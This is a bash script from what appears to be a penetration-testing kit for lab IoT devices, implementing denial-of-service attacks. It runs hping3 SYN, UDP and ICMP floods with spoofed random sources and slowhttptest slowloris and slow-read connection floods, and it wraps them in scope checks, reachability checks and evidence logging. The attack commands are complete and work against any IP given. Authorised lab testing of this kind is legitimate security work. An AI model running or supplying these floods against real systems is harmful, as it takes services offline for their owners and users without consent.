#!/usr/bin/env bash
# Phase 7 — DoS / DDoS (session label: dos)
# Volume-based and application-layer denial-of-service against one lab device at a time.
#
# Usage (from the engagement root):
#   ./07_dos_ddos/dos.sh syn    <ip> [duration_s]    # SYN flood (TCP layer)
#   ./07_dos_ddos/dos.sh udp    <ip> [duration_s]    # UDP flood
#   ./07_dos_ddos/dos.sh icmp   <ip> [duration_s]    # ICMP flood
#   ./07_dos_ddos/dos.sh http   <ip> [port] [duration_s]  # HTTP slow-read / slowloris
#
# ATT&CK: T1498.001 (Network DoS — Direct Flood), T1499 (Endpoint DoS)
# Kill-chain phase: Actions on Objectives
# Session label: dos
#
# SAFETY: Run ONE device at a time. Confirm recovery with preflight.sh after each run.
#         Adjust DURATION to the shortest window needed for observable evidence.
. "$(dirname "$0")/../lib.sh"

LABEL=dos

need() {
  for t in "$@"; do
    command -v "$t" >/dev/null 2>&1 || { echo "[!] $t missing — see 01_setup/attack-host-setup.md"; exit 3; }
  done
}

# Default flood duration in seconds; keep short in the lab — enough for a clear metric.
DURATION="${DOS_DURATION:-30}"

pre_check() {
  local ip="$1"
  echo "[*] Pre-DoS reachability check:"
  ping -c 3 -W 1 "$ip" | tail -3
}

post_check() {
  local ip="$1"
  echo "[*] Post-DoS reachability check (run after device stabilises):"
  ping -c 5 -W 2 "$ip" | tail -3
  echo "[!] If device is still unreachable after 120 s, power-cycle and record recovery time."
}

# ---------------------------------------------------------------------------
# SYN flood — TCP SYN packets, no ACK; exhausts half-open connection table.
# Tool: hping3  ATT&CK: T1498.001
# Detection: netstat shows ESTABLISHED/SYN_RECV flood; device latency spikes.
# ---------------------------------------------------------------------------
do_syn() {
  local ip="${1:?usage: dos.sh syn <ip> [duration_s]}" dur="${2:-$DURATION}"
  require_scope "$ip"; need hping3
  local dir; dir=$(new_run "$LABEL" "$ip")
  pre_check "$ip"

  echo "[*] SYN flood -> ${ip}  duration=${dur}s"
  local cmd="hping3 -S --flood -p 80 --rand-source -c $((dur * 1000)) ${ip}"
  save_cmd "$dir" "$cmd"
  echo "+ $cmd"
  # hping3 --flood runs until -c packets sent; no need for timeout wrapper
  sudo hping3 -S --flood -p 80 --rand-source -c $((dur * 1000)) "$ip" 2>&1 \
    | tee "${dir}/stdout.txt" || true

  post_check "$ip"
  end_run "$LABEL" "$ip"; echo ">> evidence: $dir"
}

# ---------------------------------------------------------------------------
# UDP flood — random UDP datagrams; saturates uplink / clogs OS recv buffer.
# Tool: hping3  ATT&CK: T1498.001
# Detection: UDP receive-queue overflow in /proc/net/udp; device becomes unresponsive.
# ---------------------------------------------------------------------------
do_udp() {
  local ip="${1:?usage: dos.sh udp <ip> [duration_s]}" dur="${2:-$DURATION}"
  require_scope "$ip"; need hping3
  local dir; dir=$(new_run "$LABEL" "$ip")
  pre_check "$ip"

  echo "[*] UDP flood -> ${ip}  duration=${dur}s"
  local cmd="hping3 --udp --flood -p 5060 --rand-source -c $((dur * 1000)) ${ip}"
  save_cmd "$dir" "$cmd"
  echo "+ $cmd"
  sudo hping3 --udp --flood -p 5060 --rand-source -c $((dur * 1000)) "$ip" 2>&1 \
    | tee "${dir}/stdout.txt" || true

  post_check "$ip"
  end_run "$LABEL" "$ip"; echo ">> evidence: $dir"
}

# ---------------------------------------------------------------------------
# ICMP flood — ICMP echo requests; saturates ICMP handler / uplink bandwidth.
# Tool: hping3  ATT&CK: T1498.001
# Detection: icmp socket queue; ping RTT spikes to >1000 ms during attack.
# ---------------------------------------------------------------------------
do_icmp() {
  local ip="${1:?usage: dos.sh icmp <ip> [duration_s]}" dur="${2:-$DURATION}"
  require_scope "$ip"; need hping3
  local dir; dir=$(new_run "$LABEL" "$ip")
  pre_check "$ip"

  echo "[*] ICMP flood -> ${ip}  duration=${dur}s"
  local cmd="hping3 --icmp --flood --rand-source -c $((dur * 1000)) ${ip}"
  save_cmd "$dir" "$cmd"
  echo "+ $cmd"
  sudo hping3 --icmp --flood --rand-source -c $((dur * 1000)) "$ip" 2>&1 \
    | tee "${dir}/stdout.txt" || true

  post_check "$ip"
  end_run "$LABEL" "$ip"; echo ">> evidence: $dir"
}

# ---------------------------------------------------------------------------
# HTTP slow-read / slowloris — application-layer exhaustion of HTTP connection
# pool; no bandwidth needed.  Effective against IoT web interfaces.
# Tool: slowhttptest  ATT&CK: T1499
# Detection: device web UI becomes unreachable; connection counter at max.
# ---------------------------------------------------------------------------
do_http() {
  local ip="${1:?usage: dos.sh http <ip> [port] [duration_s]}" port="${2:-80}" dur="${3:-$DURATION}"
  require_scope "$ip"; need slowhttptest
  local dir; dir=$(new_run "$LABEL" "$ip")
  pre_check "$ip"

  echo "[*] HTTP slow-connection flood -> http://${ip}:${port}  duration=${dur}s"

  # -H slowloris mode  -B slow-read mode  -c 1000 connections  -i 10 interval  -r 200 rate  -t GET
  local cmd="slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://${ip}:${port}/ -x ${dur} -o ${dir}/slowhttp"
  save_cmd "$dir" "$cmd"
  echo "+ $cmd"
  slowhttptest -c 1000 -H -i 10 -r 200 -t GET \
    -u "http://${ip}:${port}/" -x "$dur" -o "${dir}/slowhttp" 2>&1 \
    | tee "${dir}/stdout.txt" || true

  # Also try slow-read variant (drains server send buffers)
  echo "[*] Slow-read variant:"
  local cmd2="slowhttptest -c 500 -B -i 5 -r 100 -t GET -u http://${ip}:${port}/ -x ${dur} -o ${dir}/slowread"
  echo "+ $cmd2"
  slowhttptest -c 500 -B -i 5 -r 100 -t GET \
    -u "http://${ip}:${port}/" -x "$dur" -o "${dir}/slowread" 2>&1 \
    | tee -a "${dir}/stdout.txt" || true

  post_check "$ip"
  end_run "$LABEL" "$ip"; echo ">> evidence: $dir"
}

# ---------------------------------------------------------------------------
cmd="${1:-}"; shift || true
case "$cmd" in
  syn)  do_syn  "$@" ;;
  udp)  do_udp  "$@" ;;
  icmp) do_icmp "$@" ;;
  http) do_http "$@" ;;
  *) sed -n '2,17p' "$0"; exit 1 ;;
esac
